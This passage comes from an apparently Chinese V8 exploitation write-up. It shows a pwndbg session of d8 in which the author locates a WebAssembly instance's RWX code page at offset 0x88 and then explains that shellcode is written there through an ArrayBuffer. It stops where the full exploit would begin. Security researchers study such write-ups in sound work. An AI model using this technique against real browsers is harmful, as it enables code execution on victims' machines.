
```
pwndbg> r
Starting program: /home/user1/Downloads/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell pwn.js
ERROR: Could not find ELF base!
[Thread debugging using libthread\_db enabled]
Using host libthread\_db library "/lib/x86\_64-linux-gnu/libthread\_db.so.1".
[New Thread 0x7ffff661a700 (LWP 10451)]
[New Thread 0x7ffff5e19700 (LWP 10452)]
[New Thread 0x7ffff5618700 (LWP 10453)]
[+] Controlled float array: 0x2480954cf2d1
V8 version 7.5.0 (candidate)
d8> var wasm\_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm\_mod = new WebAssembly.Module(wasm\_code);
var wasm\_instance = new WebAssembly.Instance(wasm\_mod);
var f = wasm\_instance.exports.main;undefined
d8> undefined
d8> undefined
d8> %DebugPrint(wasm\_instance)
0x3f294ab636d1 <Instance map = 0x2df6fb509789>
[object WebAssembly.Instance]
d8> %SystemBreak()
Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
0x00005555561647a1 in v8::base::OS::DebugBreak() ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────
RAX 0x0
RBX 0x555556320e50 —▸ 0x7fffffffdfd0 ◂— 0x555556320e50
RCX 0x5555560e9500 (Builtins\_CallRuntimeHandler) ◂— push rbp
RDX 0x555556320e50 —▸ 0x7fffffffdfd0 ◂— 0x555556320e50
RDI 0x0
RSI 0x7fffffffd928 —▸ 0x708362c04d1 ◂— 0x708362c05
R8 0x3f294ab41869 ◂— 0x708362c0f
R9 0x3a
R10 0x100000000
R11 0xfffffffffffffffb
R12 0x5555563a82c0 ◂— 0x0
R13 0x555556320ed0 —▸ 0x708362c0751 ◂— 0xb600000708362c07
R14 0x0
R15 0x5555563a6388 ◂— 0x1baddead0baddeaf
RBP 0x7fffffffd8d0 —▸ 0x7fffffffd8f8 —▸ 0x7fffffffd918 —▸ 0x7fffffffd950 —▸ 0x7fffffffd978 ◂— ...
RSP 0x7fffffffd8a8 —▸ 0x555555e1b825 ◂— mov r14, qword ptr [rbx + 0x58]
RIP 0x5555561647a1 (v8::base::OS::DebugBreak()+1) ◂— ret
► 0x5555561647a1 <v8::base::OS::DebugBreak()+1> ret <0x555555e1b825>
↓
0x555555e1b825 mov r14, qword ptr [rbx + 0x58]
0x555555e1b829 mov rsi, qword ptr [rbx + 0x9da8]
0x555555e1b830 mov qword ptr [rbx + 0x9da8], r15
0x555555e1b837 add dword ptr [rbx + 0x9db8], -1
0x555555e1b83e cmp qword ptr [rbx + 0x9db0], r12
0x555555e1b845 je 0x555555e1b860 <0x555555e1b860>
↓
0x555555e1b860 mov rdi, r15
0x555555e1b863 call 0x555555b4b2d0 <0x555555b4b2d0>
0x555555e1b868 mov rax, r14
0x555555e1b86b pop rbx
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd8a8 —▸ 0x555555e1b825 ◂— mov r14, qword ptr [rbx + 0x58]
01:0008│ 0x7fffffffd8b0 —▸ 0x555555e1b7f0 ◂— push rbp
02:0010│ 0x7fffffffd8b8 —▸ 0x5555562d0740 (v8::internal::kIntrinsicFunctions) ◂— 0x0
03:0018│ 0x7fffffffd8c0 ◂— 0x0
04:0020│ 0x7fffffffd8c8 —▸ 0x7fffffffd928 —▸ 0x708362c04d1 ◂— 0x708362c05
05:0028│ rbp 0x7fffffffd8d0 —▸ 0x7fffffffd8f8 —▸ 0x7fffffffd918 —▸ 0x7fffffffd950 —▸ 0x7fffffffd978 ◂— ...
06:0030│ 0x7fffffffd8d8 —▸ 0x555556095f94 (Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvInRegister\_NoBuiltinExit+52) ◂— cmp rax, qword ptr [r13 + 0xb8]
07:0038│ 0x7fffffffd8e0 ◂— 0xffffffffffffffff
────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────
► f 0 0x5555561647a1 v8::base::OS::DebugBreak()+1
f 1 0x555555e1b825
f 2 0x555556095f94 Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvInRegister\_NoBuiltinExit+52
f 3 0x5555560e9552 Builtins\_CallRuntimeHandler+82
f 4 0x5555560091a6 Builtins\_InterpreterEntryTrampoline+678
f 5 0x708362c04d1
f 6 0x3a00000000
f 7 0x3f294ab63e69
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> telescope 0x3f294ab636d1-1+0x88
00:0000│ 0x3f294ab63758 —▸ 0x145b75cf7000 ◂— movabs r10, 0x145b75cf7260 /\* 0x145b75cf7260ba49 \*/
01:0008│ 0x3f294ab63760 —▸ 0x2480954d2181 ◂— 0x7100002df6fb5091
02:0010│ 0x3f294ab63768 —▸ 0x2480954d2461 ◂— 0x7100002df6fb50ad
03:0018│ 0x3f294ab63770 —▸ 0x3f294ab41869 ◂— 0x708362c0f
04:0020│ 0x3f294ab63778 —▸ 0x3f294ab637f9 ◂— 0x7100002df6fb50a1
05:0028│ 0x3f294ab63780 —▸ 0x708362c04d1 ◂— 0x708362c05
... ↓ 2 skipped
pwndbg> vmmap 0x145b75cf7000
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x145b75cf7000 0x145b75cf8000 rwxp 1000 0 +0x0
```

可以看到rwx内存页的地址位于`wasm_instance`对象的`0x88`偏移的位置。

通过`ArrayBuffer`来对这块内存写入shellcode，完整的exp如下：
